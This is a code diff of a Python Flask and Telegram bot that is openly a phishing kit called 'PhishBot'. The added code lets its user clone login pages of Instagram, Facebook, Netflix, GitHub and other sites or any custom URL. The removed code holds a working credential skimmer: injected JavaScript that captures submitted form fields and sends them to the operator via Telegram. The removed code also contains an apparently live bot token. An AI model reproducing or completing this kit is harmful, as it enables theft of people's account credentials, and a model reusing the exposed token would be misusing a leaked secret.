@@ -1,66 +1,94 @@
-from flask import Flask, request, render_template_string
+from flask import Flask
+import threading
+import telebot
+from telebot import types
 import os
-import json
-from telebot import TeleBot
+from sel import clone_page
+from is_ob import is_obfuscated
 
-# 🔐 Your Telegram bot token
-API_TOKEN = '8110718903:AAFlE-nSLZZPXUSmkYdEmCc69ZvIXp7iy_k'
-bot = TeleBot(API_TOKEN)
+API_TOKEN = 'your_bot_token_here'
+bot = telebot.TeleBot(API_TOKEN)
 
 app = Flask(__name__)
 
-# 📦 Injects JS into HTML page to capture credentials
-def inject_payload(html_content, user_id):
-    script = f"""
-    <script>
-    document.addEventListener('submit', function(e) {{
-        e.preventDefault();
-        const formData = new FormData(e.target);
-        fetch("/capture", {{
-            method: "POST",
-            headers: {{
-                "Content-Type": "application/json"
-            }},
-            body: JSON.stringify({{
-                user_id: "{user_id}",
-                data: Object.fromEntries(formData)
-            }})
-        }});
-    }});
-    </script>
-    """
-    return html_content.replace('</body>', f'{script}</body>')
+TEMPLATES = [
+    "Instagram", "Facebook", "Netflix", "Twitter", "Snapchat",
+    "GitHub", "LinkedIn", "Spotify", "Reddit", "Amazon", "Custom URL"
+]
 
-# 📄 Serve the cloned HTML page for a specific user
-@app.route("/user/<int:user_id>")
-def serve_cloned_page(user_id):
-    filepath = f"clones/user_{user_id}/index.html"
-    if os.path.exists(filepath):
+user_states = {}
+
+@app.route('/')
+def home():
+    return "🤖 Bot is running on Flask server!"
+
+# -------------------- BOT HANDLERS --------------------
+
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    bot.reply_to(message, (
+        "🎣 Welcome to PhishBot!\n\n"
+        "Available commands:\n"
+        "/fish - Start phishing setup\n"
+        "/help - Show help\n"
+        "/info - About the bot"
+    ))
+
+@bot.message_handler(commands=['info'])
+def send_info(message):
+    bot.reply_to(message, "🤖 This bot helps simulate phishing pages. Use /fish to begin (for educational use only).")
+
+@bot.message_handler(commands=['fish'])
+def send_fish_menu(message):
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+    buttons = [types.KeyboardButton(site) for site in TEMPLATES]
+    markup.add(*buttons)
+    bot.send_message(message.chat.id, "📄 Choose a site to phish or select 'Custom URL':", reply_markup=markup)
+
+@bot.message_handler(func=lambda message: message.text in TEMPLATES)
+def handle_template_selection(message):
+    selected = message.text
+    if selected == "Custom URL":
+        user_states[message.chat.id] = "awaiting_url"
+        bot.send_message(message.chat.id, "🌐 Please send the URL you want to clone.")
+    else:
+        bot.send_message(message.chat.id, f"✅ You selected: {selected}\n⚙️ Generating link...")
+        # TODO: Add support for default templates
+
+@bot.message_handler(func=lambda message: user_states.get(message.chat.id) == "awaiting_url")
+def handle_custom_url(message):
+    url = message.text
+    user_id = message.chat.id
+    output_dir = f"clones/user_{user_id}"
+    user_states.pop(user_id, None)
+
+    bot.send_message(user_id, f"🔄 Cloning {url}...")
+
+    filepath = clone_page(url, output_folder=output_dir)
+
+    if filepath and os.path.exists(filepath):
+        bot.send_message(user_id, f"✅ Page cloned! Checking for obfuscation...")
+
         with open(filepath, "r", encoding="utf-8") as f:
-            html = f.read()
-        modified_html = inject_payload(html, user_id)
-        return render_template_string(modified_html)
-    return "❌ Page not found!"
+            html_content = f.read()
 
-# 📥 Endpoint where JS sends captured form credentials
-@app.route("/capture", methods=["POST"])
-def capture():
-    data = request.get_json()
-    user_id = data.get("user_id")
-    form_data = data.get("data")
+        if is_obfuscated(html_content):
+            bot.send_message(user_id, "⚠️ The cloned page appears to be obfuscated. Cannot inject payload.")
+        else:
+            bot.send_message(user_id, "✅ The HTML looks clean. Proceeding with payload injection...")
+            # TODO: Inject payload, host, send link
+    else:
+        bot.send_message(user_id, "❌ Failed to clone the page. Try another link.")
 
-    if not user_id or not form_data:
-        return "Missing data", 400
+@bot.message_handler(func=lambda message: True)
+def fallback(message):
+    bot.reply_to(message, "❓ Unknown command. Use /start to see available options.")
 
-    message = "🔐 New credentials captured:\n\n"
-    for key, value in form_data.items():
-        message += f"{key}: {value}\n"
+# -------------------- RUN BOT IN BACKGROUND THREAD --------------------
 
-    try:
-        bot.send_message(user_id, message)
-        return "OK", 200
-    except Exception as e:
-        return f"Failed to send message: {str(e)}", 500
+def run_bot():
+    bot.infinity_polling()
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+if __name__ == '__main__':
+    threading.Thread(target=run_bot).start()
+    app.run(host='0.0.0.0', port=5000)
